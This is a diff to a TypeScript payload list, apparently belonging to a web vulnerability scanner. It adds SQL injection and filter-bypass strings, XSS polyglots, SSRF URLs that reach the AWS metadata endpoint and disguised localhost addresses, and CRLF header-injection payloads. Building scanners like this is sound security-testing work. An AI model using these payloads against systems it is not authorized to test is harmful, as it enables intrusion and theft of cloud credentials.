@@ -1,4 +1,3 @@
-
 export type PayloadCategory = {
   type: 'ParamCheck' | 'FileCheck';
   payloads: string[];
@@ -16,7 +15,11 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "' OR 1=1#",
       "' OR 1=1/*",
       "' OR SLEEP(5)--",
-      "' OR 1=1 LIMIT 1;--"
+      "' OR 1=1 LIMIT 1;--",
+      "WAITFOR DELAY '0:0:5'",
+      ")) OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+      "%2553%2527%2520OR%25201%253D1",  // URL encoded bypass
+      "/**/OR/**/1=1",  // Comment bypass
     ]
   },
   "XSS": {
@@ -28,7 +31,11 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "<svg/onload=alert('xss')>",
       "<body onload=alert('xss')>",
       "<a href=javascript:alert('xss')>click</a>",
-      "<math href=javascript:alert(1)>"
+      "<math href=javascript:alert(1)>",
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
+      "<marquee onstart=alert(1)>",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
+      "<input onfocus=alert(1) autofocus>",
     ]
   },
   "Path Traversal": {
@@ -62,7 +69,12 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "http://localhost:80/",
       "http://0.0.0.0:80/",
       "http://[::1]/",
-      "http://example.com@127.0.0.1/"
+      "http://example.com@127.0.0.1/",
+      "http://169.254.169.254/latest/meta-data/",  // AWS metadata
+      "http://[::ffff:127.0.0.1]",  // IPv6 bypass
+      "http://127.1",  // Short notation
+      "http://0177.0.0.1",  // Octal bypass
+      "http://2130706433",  // Decimal bypass
     ]
   },
   "NoSQL Injection": {
@@ -124,6 +136,14 @@ export const PAYLOADS: Record<string, PayloadCategory> = {
       "database.yml",
       ".htpasswd",
       ".htaccess"
+    ]
+  },
+  "CRLF Injection": {
+    type: "ParamCheck",
+    payloads: [
+      "%0d%0aSet-Cookie: malicious=true",
+      "\r\nLocation: http://malicious.com",
+      "%0d%0aContent-Length:0"
     ]
   }
 };
